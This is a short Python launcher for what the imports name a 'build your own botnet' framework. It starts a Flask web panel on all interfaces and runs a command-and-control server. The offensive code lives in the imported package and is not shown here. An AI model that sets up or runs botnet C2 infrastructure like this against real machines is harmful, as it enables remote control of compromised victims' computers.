#!/usr/bin/env python3
from buildyourownbotnet import app, server
from threading import Thread

def run_flask_app():
    with app.app_context():
        app.db.create_all()
        app.run(host='0.0.0.0', port=5000)

if __name__ == '__main__':
    # Create a thread for the Flask app
    flask_thread = Thread(target=run_flask_app)
    flask_thread.start()

    # Start C2 server
    server.main()
